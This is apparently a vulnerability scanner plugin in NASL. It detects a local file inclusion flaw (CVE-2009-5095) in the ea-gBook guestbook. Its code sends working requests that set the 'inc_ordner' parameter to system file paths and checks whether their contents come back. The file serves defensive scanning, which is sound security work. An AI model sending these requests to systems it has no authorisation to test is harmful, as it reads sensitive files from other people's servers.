if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901207" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-09-23 16:39:49 +0200 (Fri, 23 Sep 2011)" );
	script_cve_id( "CVE-2009-5095" );
	script_bugtraq_id( 33774 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "ea-gBook 'inc_ordner' Parameter Local File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/33927" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/48759" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/8052/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to gain sensitive
  information." );
	script_tag( name: "affected", value: "ea-gBook version 0.1.4 and prior." );
	script_tag( name: "insight", value: "The flaw is due to improper validation of input passed via
  'inc_ordner' parameter to 'index_inc.php' script, which allows attackers to
  read arbitrary files." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running ea-gBook and is prone to local file inclusion
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/ea-gBook", "/gbuch", "/gb", "/guestbook", "/Gaestebuch", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = NASLString( "GET ", dir, "/index.php?seite=0 HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6\\r\\n", "Cache-Control: max-age=0\\r\\n\\r\\n" );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "<title>ea-gBook" ) && ContainsString( res, "ea-style.de" )){
		for file in keys( files ) {
			req = NASLString( "GET ", dir, "/index_inc.php?inc_ordner=/", files[file], " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6\\r\\n", "Cache-Control: max-age=0\\r\\n\\r\\n" );
			res = http_keepalive_send_recv( port: port, data: req );
			if(egrep( pattern: file, string: res )){
				security_message( port: port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

